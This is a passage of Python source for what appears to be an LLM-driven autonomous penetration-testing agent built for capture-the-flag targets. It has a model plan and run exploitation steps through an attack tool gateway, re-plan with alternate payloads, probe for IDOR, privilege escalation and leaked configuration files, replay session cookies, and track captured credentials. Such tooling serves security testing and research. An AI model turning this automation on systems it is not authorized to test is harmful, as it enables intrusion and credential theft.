                f"[PHASE TRANSITION] Planning exploitation. No vulnerabilities identified yet.\n"
                f"Previous reconnaissance and analysis context is preserved above.\n"
                f"Start with reconnaissance to identify potential vulnerabilities."
            )
        self.llm.add_context_message(transition_msg, role="user")
        self._maybe_compress()
        content, _ = self.llm.generate(
            prompt=prompt,
            system_prompt=SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED,
        )
        self._task_log_event("info", "llm_exploit_plan",
            response=content[:2000],
            tokens_used=self.llm.token_count,
        )

        steps = self._extract_json(content)
        if not isinstance(steps, list) or not steps:
            log.warning("_llm_driven_exploit: LLM returned no parseable steps: %s",
                       str(content)[:200])
            return None

        # Execute steps with up to 2 rounds of re-planning
        for round_num in range(3):
            for step in steps[:6]:
                if not isinstance(step, dict):
                    continue
                if self._time_exceeded() or self._tokens_exceeded():
                    return None

                tool_name = step.get("tool", "")
                params = step.get("params", {})
                reason = step.get("reason", "")

                # Build dispatch set: attack gateway + MCP pool
                _all_tool_names = self.attack_gateway.get_tool_names()
                try:
                    _all_tool_names += self.mcp_pool.get_tool_names()
                except Exception:
                    pass
                if tool_name not in _all_tool_names:
                    continue

                self.step_count += 1
                try:
                    if tool_name in self.attack_gateway.get_tool_names():
                        result = await self.attack_gateway.call(tool_name, params)
                    elif tool_name in self.mcp_pool.get_tool_names():
                        mcp_raw = await self.mcp_pool.call_tool(tool_name, params)
                        # Convert MCP response dict → ToolResult
                        if isinstance(mcp_raw, dict) and "content" in mcp_raw:
                            text_parts = []
                            for c in mcp_raw.get("content", []):
                                if isinstance(c, dict) and c.get("type") == "text":
                                    text_parts.append(c.get("text", ""))
                            result = ToolResult(
                                tool_name=tool_name,
                                success=not mcp_raw.get("isError", False),
                                stdout="\n".join(text_parts),
                                exit_code=1 if mcp_raw.get("isError") else 0,
                            )
                        else:
                            result = ToolResult(
                                tool_name=tool_name, success=False,
                                stdout=str(mcp_raw or "MCP error"),
                            )
                    else:
                        result = ToolResult(
                            tool_name=tool_name, success=False,
                            stdout=f"Unknown tool: {tool_name}",
                        )
                except Exception as e:
                    self._task_log_event("info", "llm_exploit_step",
                        round=round_num, tool=tool_name, error=str(e))
                    continue

                stdout = result.stdout
                # Check for flag in tool output
                flags = self.flag_pattern.findall(stdout)
                if flags:
                    self._task_log_event("info", "flag_found_llm_exploit",
                        tool=tool_name, flag=flags[0])
                    self.phase = OrchestratorPhase.DONE
                    return TaskResult(
                        success=True, flag=flags[0], steps=self.step_count,
                        tokens_used=self.llm.token_count,
                        time_elapsed=time.time() - self.start_time,
                    )

                step["result"] = stdout[:500]
                self._task_log_event("info", "llm_exploit_step",
                    round=round_num, tool=tool_name,
                    params=str(params)[:200], reason=reason,
                    result=stdout[:500])

            if round_num < 2:
                # Feed results back for re-planning
                feedback = "\n".join(
                    f"{s.get('tool','?')}: {s.get('result','')[:200]}"
                    for s in steps[:6] if isinstance(s, dict) and s.get('result')
                )
                if not feedback:
                    break
                replan_prompt = f"""Previous exploitation results:
{feedback}

Some steps failed. What should we try next?
Consider: different payloads, encoding types, alternative endpoints,
or combining multiple tools.

Respond ONLY with a JSON array of next steps (max 5)."""

                self._maybe_compress()
                content2, _ = self.llm.generate(
                    prompt=replan_prompt,
                    system_prompt=SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED,
                )
                steps = self._extract_json(content2)
                if not isinstance(steps, list):
                    break
            else:
                break

        return None


    # ── Systematic Post-Check (LLM-driven) ─────────────────────────

    async def _systematic_post_check(self, target_url: str) -> TaskResult | None:
        """LLM-driven systematic checks after the main loop.

        Instead of hardcoded IDOR headers/IDs/paths, the LLM analyzes what
        we've learned and generates targeted checks for this specific target.
        """
        log.info("_systematic_post_check starting")
        # Mark context boundary but preserve conversation history.
        # Prior tool_calls from the solo cycle are still valid conversation
        # context — the LLM already saw their results.
        self.llm.add_context_message(
            "[SYSTEMATIC POST-CHECK] Running targeted checks on known endpoints. "
            "Prior automated tests and plan tasks are complete. "
            "Look for privilege escalation, IDOR, parameter tampering, and "
            "hidden endpoints that the automated tools may have missed.",
            role="user",
        )
        await self._try_auto_login(target_url, None, None)

        # Gather what we know
        eps = [e.get("url", "") for e in self.dkg.query_nodes("Endpoint")[:30]]
        vulns = [(v.get("vuln_type", ""), v.get("endpoint", ""))
                 for v in self.dkg.query_nodes("Vulnerability")[:10]]
        cookies = ""
        if self.client._session and self.client._session.cookie_jar:
            jar = list(self.client._session.cookie_jar)
            if jar:
                cookies = "; ".join(f"{c.key}={c.value}" for c in jar)

        for port in getattr(self, '_discovered_http_ports', []):
            host = getattr(self, "target_host", None) or "localhost"
            scheme = "https" if port == 443 else "http"
            base = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"

            # Ask LLM to generate targeted checks
            self._maybe_compress()
            check_content, _ = self.llm.generate(
                prompt=f"Target: {base}\n"
                       f"Endpoints: {eps}\n"
                       f"Known vulns: {vulns}\n"
                       f"Session: {'authenticated' if cookies else 'none'}\n\n"
                       f"We haven't found the flag yet. Generate targeted checks. "
                       f"Consider: IDOR with different user IDs, privilege escalation "
                       f"(is_admin=1, role=admin), parameter tampering, hidden endpoints. "
                       f"For each check, specify the HTTP request details.\n\n"
                       f"Output JSON array: [{{\"method\": \"GET\", \"path\": \"...\", "
                       f"\"headers\": {{}}, \"data\": {{}}, \"reason\": \"...\"}}]",
                system_prompt="You are a penetration tester. Output only valid JSON array.",
            )
            checks = self._extract_json(check_content)
            if not isinstance(checks, list):
                continue

            for check in checks[:10]:  # Cap at 10 LLM-suggested checks
                if self._time_exceeded():
                    return None
                try:
                    method = (check.get("method") or "GET").upper()
                    path = check.get("path", "")
                    if not path.startswith("/"):
                        path = "/" + path
                    url = base + path
                    headers = check.get("headers") or {}
                    data = check.get("data") or {}
                    if cookies and "Cookie" not in headers:
                        headers["Cookie"] = cookies

                    if method == "POST":
                        resp = await self.client.post(url, data=data, headers=headers)
                    else:
                        resp = await self.client.get(url, headers=headers)

                    flags = self.flag_pattern.findall(resp.body)
                    for f in flags:
                        is_valid, _ = DAVE.verify_basic(f, resp.body)
                        if is_valid:
                            self._task_log_event("info", "flag_found_systematic",
                                method="llm_check", path=path, flag=f)
                            self.phase = OrchestratorPhase.DONE
                            self.step_count += 1
                            return TaskResult(
                                success=True, flag=f, steps=self.step_count,
                                tokens_used=self.llm.token_count,
                                time_elapsed=time.time() - self.start_time,
                            )
                    self.step_count += 1
                except Exception:
                    pass

        return None

    # ── Flag Search ──────────────────────────────────────────────────

    async def _check_response_for_flag(self, target_url: str) -> TaskResult | None:
        """Search response body for flag patterns across all discovered HTTP services.

        Uses LLM to suggest smart flag paths based on the technology stack
        and discovered endpoints, then probes them all.
        """
        import urllib.parse as _up3
        urls_to_check: list[str] = []

        for svc in self.dkg.query_nodes("Service"):
            port = svc.get("port", 0)
            proto = svc.get("protocol", "").lower()
            if port and port != 0 and "http" in proto:
                host = getattr(self, "target_host", None)
                if host:
                    scheme = "https" if port == 443 else "http"
                    base = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
                    urls_to_check.append(base)

        parsed = _up3.urlparse(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        if base not in urls_to_check:
            urls_to_check.append(base)

        # Probe all discovered endpoints
        for ep in self.dkg.query_nodes("Endpoint"):
            eu = ep.get("url", "")
            if eu and eu not in urls_to_check:
                urls_to_check.append(eu)

        # Ask LLM to suggest smart flag paths based on context
        svc_list = [f"{s.get('port')}/{s.get('protocol','tcp')} {s.get('version','')}"
                    for s in self.dkg.query_nodes("Service")]
        ep_list = [e.get("url", "") for e in self.dkg.query_nodes("Endpoint")[:20]]
        flag_paths = ["/flag", "/flag.txt", "/robots.txt", "/.git/HEAD"]  # sensible defaults
        try:
            self._maybe_compress()
            llm_paths_content, _ = self.llm.generate(
                prompt=f"Target services: {svc_list}\n"
                       f"Discovered endpoints: {ep_list}\n\n"
                       f"Suggest additional URL paths to probe for flags/credentials. "
                       f"Consider: backup files, config leaks, admin panels, API docs, "
                       f"debug endpoints. Output JSON array of path strings only.",
                system_prompt="You are a penetration tester. Output only a JSON array of URL paths.",
            )
            llm_paths = self._extract_json(llm_paths_content)
            if isinstance(llm_paths, list):
                flag_paths = list(dict.fromkeys(flag_paths + llm_paths))  # dedup, defaults first
        except Exception:
            pass

        for bu in urls_to_check:
            for path in flag_paths:
                try:
                    response = await self.client.get(bu.rstrip("/") + path)
                    flags = self.flag_pattern.findall(response.body)
                    if flags:
                        self._task_log_event("info", "flag_found", url=bu+path, flag=flags[0])
                        self.phase = OrchestratorPhase.DONE
                        return TaskResult(
                            success=True, flag=flags[0], steps=self.step_count,
                            tokens_used=self.llm.token_count,
                            time_elapsed=time.time() - self.start_time,
                        )
                except Exception:
                    continue
        return None

    # ── Helpers ──────────────────────────────────────────────────────

    def _print_phase(self, name: str) -> None:
        """Print a phase transition banner."""
        line = "=" * 56
        print(f"\n{line}\n  PHASE: {name}\n{line}")

    def _print_discovery(self, category: str, items: list[str], max_show: int = 8) -> None:
        """Print discovered items with count. Skips if empty."""
        if not items:
            return
        print(f"\n[{category}] {len(items)} discovered:")
        for item in items[:max_show]:
            print(f"  - {item}")
        if len(items) > max_show:
            print(f"  ... and {len(items) - max_show} more")

    def _print_plan_status(self) -> None:
        """Print current exploitation plan status to console."""
        status = self._format_plan_status()
        if status and status != "(no plan)":
            print(f"\n{status}")

    def _print_task_execution(self, task: dict, tool_names: list[str], iteration: int) -> None:
        """Print task execution header."""
        tid = task.get("id", "?")
        instr = task.get("instruction", "")[:100]
        print(f"\n[{self.phase.value.upper()}:{iteration}] Task {tid}: {instr}")
        if tool_names:
            print(f"  Tools: {', '.join(tool_names[:3])}")

    def _print_task_result(self, task: dict, success: bool, result_summary: str) -> None:
        """Print task result summary."""
        status_icon = "  [OK]" if success else "  [FAIL]"
        print(f"{status_icon} {result_summary[:250]}")

    def _print_progress(self, scaling_level: Any, B: float) -> None:
        """Print loop progress indicator."""
        elapsed = time.time() - self.start_time
        flag_count = len(getattr(self, '_known_flags', set()))
        print(
            f"\n{'─' * 48}\n"
            f"Loop {self._loop_count}/{getattr(self, 'MAX_LOOPS', 10)} | "
            f"Phase: {self.phase.value.upper()} | "
            f"Mode: {scaling_level.value if hasattr(scaling_level, 'value') else scaling_level}"
            f" (B={B:.2f}) | "
            f"Flags: {flag_count} | "
            f"Tokens: {self.llm.token_count} | "
            f"Elapsed: {elapsed:.0f}s/{self.time_budget}s\n"
            f"{'─' * 48}"
        )

    def _task_log_event(self, level: str, event: str, **data: Any) -> None:
        """Record a structured event in the task log."""
        self._task_log.append({
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime()),
            "elapsed_s": round(time.time() - self.start_time, 3),
            "phase": self.phase.value,
            "level": level,
            "event": event,
            **data,
        })

    def _task_log_write(self) -> None:
        """Persist the task log to JSON file."""
        if self._task_log_path and self._task_log:
            os.makedirs(os.path.dirname(self._task_log_path) or ".", exist_ok=True)
            with open(self._task_log_path, "w", encoding="utf-8") as f:
                json.dump({
                    "target": self.target_url,
                    "model": self.llm.model,
                    "provider": self.llm.provider,
                    "time_budget": self.time_budget,
                    "events": self._task_log,
                    "dkg_summary": self.dkg.summary(),
                    "cteg_patterns_committed": getattr(self, '_cteg_committed', 0),
                }, f, indent=2, default=str)
            log.info("Task log written to %s (%d events)", self._task_log_path, len(self._task_log))

    def _checkpoint_path(self, phase: str) -> str:
        """Generate a checkpoint path for a given phase."""
        sanitized = re.sub(r"[^a-zA-Z0-9_.-]", "_", self.target_url)
        return os.path.join("checkpoints", f"checkpoint_{sanitized}_{phase}.json")

    def _save_orchestrator_checkpoint(self, phase_suffix: str = "") -> str:
        """Save full orchestrator state + DKG for potential resume."""
        ts = time.strftime("%Y%m%d_%H%M%S", time.localtime(self.start_time or time.time()))
        suffix = f"_{phase_suffix}" if phase_suffix else ""
        path = os.path.join("checkpoints", f"resume_{ts}{suffix}.json")
        dkg_path = os.path.join("checkpoints", f"dkg_{ts}{suffix}.json")

        checkpoint = {
            "_format_version": 1,
            "target_url": getattr(self, 'target_url', ''),
            "phase": self.phase.value,
            "loop_count": getattr(self, '_loop_count', 0),
            "step_count": self.step_count,
            "start_time": self.start_time,
            "task_description": getattr(self, '_task_description', ''),
            "solo_iterations": self._solo_iterations,
            "analyze_done": self._analyze_done,
            "svc_research_done": self._svc_research_done,
            "research_done": self._research_done,
            "known_flags": list(self._known_flags) if hasattr(self, '_known_flags') else [],
            "solo_exhausted": getattr(self, '_solo_exhausted', False),
            "vulnerabilities": [
                {"vuln_type": v.vuln_type, "endpoint": v.endpoint,
                 "param": v.param, "confidence": v.confidence,
                 "evidence": v.evidence, "suggested_tool": v.suggested_tool,
                 "tool_args": v.tool_args}
                for v in self.vulnerabilities
            ],
            "exploitation_plan": (
                {"plan_id": self.exploitation_plan.plan_id,
                 "phase": self.exploitation_plan.phase,
                 "goal": self.exploitation_plan.goal,
                 "tasks": self.exploitation_plan.tasks,
                 "status": self.exploitation_plan.status}
                if self.exploitation_plan else None
            ),
            "exhausted_task_ids": list(self._exhausted_task_ids),
            # Chain / multi-flag mode state
            "chain_mode": getattr(self, '_chain_mode', False),
            "captured_flags": list(getattr(self, '_captured_flags', [])),
            "chain_services_total": getattr(self, '_chain_services_total', 0),
            "chain_exhausted": getattr(self, '_chain_exhausted', False),
            "no_progress_loops": getattr(self, '_no_progress_loops', 0),
            "solo_exhausted_stall": getattr(self, '_solo_exhausted_stall', 0),
            "solo_empty_runs": getattr(self, '_solo_empty_runs', 0),
            "prev_solo_done_count": getattr(self, '_prev_solo_done_count', 0),
            "dkg_path": dkg_path,
        }

        os.makedirs("checkpoints", exist_ok=True)
        with open(path, "w") as f:
            json.dump(checkpoint, f, indent=2, default=str)
        self.dkg.save(dkg_path)
        log.info("Orchestrator checkpoint saved: %s", path)
        return path

    def _find_latest_checkpoint(self, target_url: str = "") -> str | None:
        """Find the most recent orchestrator checkpoint, optionally matching target."""
        import glob
        pattern = os.path.join("checkpoints", "resume_*.json")
        files = sorted(glob.glob(pattern), key=os.path.getmtime, reverse=True)
        if not target_url:
            return files[0] if files else None
        for f in files:
            try:
                with open(f) as fh:
                    data = json.load(fh)
                if data.get("target_url") == target_url:
                    return f
            except Exception:
                continue
        return None

    async def _load_orchestrator_checkpoint(self, path: str) -> bool:
        """Load orchestrator + DKG from checkpoint. Returns True on success."""
        try:
            with open(path) as f:
                checkpoint = json.load(f)

            if checkpoint.get("_format_version") != 1:
                log.warning("Checkpoint format version mismatch: %s", path)
                return False

            self.target_url = checkpoint.get("target_url", self.target_url)
            self.phase = OrchestratorPhase(checkpoint.get("phase", "init"))
            self._loop_count = checkpoint.get("loop_count", 0)
            self.step_count = checkpoint.get("step_count", 0)
            self.start_time = checkpoint.get("start_time", time.time())
            self._task_description = checkpoint.get("task_description", "")
            self._solo_iterations = checkpoint.get("solo_iterations", 0)
            self._analyze_done = checkpoint.get("analyze_done", False)
            self._svc_research_done = checkpoint.get("svc_research_done", False)
            self._research_done = checkpoint.get("research_done", False)
            self._known_flags = set(checkpoint.get("known_flags", []))
            self._solo_exhausted = checkpoint.get("solo_exhausted", False)
            self._exhausted_task_ids = set(checkpoint.get("exhausted_task_ids", []))

            # Restore chain / multi-flag mode state
            self._chain_mode = checkpoint.get("chain_mode", False)
            self._captured_flags = checkpoint.get("captured_flags", [])
            self._chain_services_total = checkpoint.get("chain_services_total", 0)
            self._chain_exhausted = checkpoint.get("chain_exhausted", False)
            self._no_progress_loops = checkpoint.get("no_progress_loops", 0)
            self._solo_exhausted_stall = checkpoint.get("solo_exhausted_stall", 0)
            self._solo_empty_runs = checkpoint.get("solo_empty_runs", 0)
            self._prev_solo_done_count = checkpoint.get("prev_solo_done_count", 0)

            # Restore vulnerabilities
            self.vulnerabilities = []
            for vd in checkpoint.get("vulnerabilities", []):
                self.vulnerabilities.append(VulnerabilityHypothesis(
                    vuln_type=vd.get("vuln_type", ""),
                    endpoint=vd.get("endpoint", ""),
                    param=vd.get("param", ""),
                    confidence=vd.get("confidence", 0.0),
                    evidence=vd.get("evidence", ""),
                    suggested_tool=vd.get("suggested_tool", ""),
                    tool_args=vd.get("tool_args", {}),
                ))

            # Restore exploitation plan
            ep_data = checkpoint.get("exploitation_plan")
            if ep_data:
                self.exploitation_plan = ExploitationPlan(
                    plan_id=ep_data.get("plan_id", f"plan-resume-{int(time.time())}"),
                    phase=ep_data.get("phase", ""),
                    goal=ep_data.get("goal", ""),
                    tasks=ep_data.get("tasks", []),
                    status=ep_data.get("status", "pending"),
                )

            # Restore DKG
            dkg_path = checkpoint.get("dkg_path", "")
            if dkg_path and os.path.exists(dkg_path):
                self.dkg = DKG.load(dkg_path)
                log.info("DKG restored from %s (%d nodes)",
                         dkg_path, len(self.dkg.graph.nodes))

            log.info("Checkpoint loaded: %s (phase=%s, loop=%d, step=%d)",
                     path, self.phase.value, self._loop_count, self.step_count)
            return True
        except Exception as e:
            log.error("Failed to load checkpoint %s: %s", path, e)
            return False

    def _check_tool_dependencies(self) -> None:
        """Verify external CLI tools exist on PATH. Warn for missing required ones."""
        self._missing_tools: set = set()
        for tool in self.REQUIRED_TOOLS:
            if not shutil.which(tool):
                self._missing_tools.add(tool)
                log.warning("Tool not found on PATH: %s — related commands will fail", tool)
        for tool in self.OPTIONAL_TOOLS:
            if not shutil.which(tool):
                log.info("Optional tool not found: %s — some features unavailable", tool)

    def _time_exceeded(self) -> bool:
        return (time.time() - self.start_time) > self.time_budget

    def _tokens_exceeded(self) -> bool:
        """Check if token budget is exceeded. Attempts compression first."""
        if self.llm.token_count <= self.token_budget:
            return False
        # Try compression before giving up
        if self._maybe_compress():
            return self.llm.token_count > self.token_budget
        return True

    def _maybe_compress(self) -> bool:
        """Compress conversation history if context load exceeds threshold.

        Returns True if compression was performed.
        """
        if self.llm.context_load < self.compression_threshold:
            return False

        # Build truncation context from current DKG state so the LLM
        # has structured facts even when conversation history is truncated
        trunc_ctx = self._build_truncation_context()

        saved = self.llm.compress(
            max_context_tokens=self.max_context_tokens,
            compression_threshold=self.compression_threshold,
            truncation_context=trunc_ctx,
        )
        if saved > 0:
            self._task_log_event("info", "context_compressed",
                tokens_saved=saved,
                new_token_count=self.llm.token_count,
                compression_count=self.llm._compressed_count,
            )
            log.info("Context compressed: saved ~%d tokens (total: %d, load: %.1f%%)",
                     saved, self.llm.token_count, self.llm.context_load * 100)
            return True
        elif saved < 0:
            log.warning("Context compression failed, continuing with high context load")
        return False

    def _build_truncation_context(self) -> str:
        """Build structured DKG state summary for injection when conversation is truncated.

        Called by _maybe_compress() when the conversation history is truncated
        (max_compressions reached).  Gives the LLM critical state facts directly
        instead of a generic "DKG has the facts" message.
        """
        lines = ["[DKG STATE AT TRUNCATION — structured facts preserved]"]
        try:
            # Flags captured so far
            flags = self.dkg.query_nodes("Flag")
            if flags:
                lines.append("Flags: " + ", ".join(
                    f.get("value", "?") for f in flags
                ))

            # Credentials discovered
            creds = self.dkg.query_nodes("Credential")
            if creds:
                lines.append(f"Credentials ({len(creds)}):")
                for c in creds[:8]:
                    lines.append(
                        f"  {c.get('cred_type','?')} {c.get('username','?')}"
                        f"@{c.get('source_host','?')}"
                        + (f" (confirmed)" if c.get("confirmed") else "")
                    )

            # Active sessions
            sessions = self.dkg.query_nodes("Session")
            if sessions:
                lines.append(f"Sessions ({len(sessions)}):")
                for s in sessions[:5]:
                    lines.append(
                        f"  {s.get('session_type','?')} on {s.get('host','?')}"
                    )

            # Services discovered (non-HTTP only to save space)
            services = self.dkg.query_nodes("Service")
            db_svcs = [s for s in services if s.get("port") and s.get("port") not in (80, 443, 8080, 8443)]
            if db_svcs:
                lines.append(f"Non-HTTP services ({len(db_svcs)}):")
                for s in db_svcs[:10]:
                    lines.append(
                        f"  {s.get('service_name','?')} on :{s.get('port')}"
                        f" ({s.get('version','')})".rstrip()
                    )

            # Vulnerability summary
            vulns = self.dkg.query_nodes("Vulnerability")
            if vulns:
                lines.append(f"Known vulnerabilities ({len(vulns)}):")
                for v in vulns[:10]:
                    lines.append(
                        f"  {v.get('vuln_type','?')} @ {v.get('endpoint','?')}"
                    )
        except Exception:
            lines.append("  (error reading DKG state)")
        return "\n".join(lines)

    @staticmethod
    def _extract_json_array(text: str) -> list | None:
        """Extract the first complete JSON array using bracket counting.

        Handles nested brackets and trailing text — more robust than regex.
        Returns the parsed list, or None if no valid array found.
        """
        start = text.find('[')
        if start == -1:
            return None
        depth = 0
        for i, c in enumerate(text[start:], start):
            if c == '[':
                depth += 1
            elif c == ']':
                depth -= 1
                if depth == 0:
                    try:
                        return json.loads(text[start:i + 1])
                    except json.JSONDecodeError:
                        return None
        return None

    @staticmethod
    def _extract_json(text: str) -> Any:
        """Extract JSON from LLM response text."""
        # Try direct parse
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            pass
        # Try to find JSON array/object in markdown code blocks
        match = re.search(r"```(?:json)?\s*([\s\S]*?)```", text)
        if match:
            try:
                return json.loads(match.group(1))
            except json.JSONDecodeError:
                pass
        # Try bracket-counting for JSON arrays (handles nesting + trailing text)
        result = Orchestrator._extract_json_array(text)
        if result is not None:
            return result
        # Non-greedy match for JSON objects (no nesting issues with {})
        match = re.search(r"\{.*?\}", text, re.DOTALL)
        if match:
            try:
                return json.loads(match.group(0))
            except json.JSONDecodeError:
                pass
        return {}

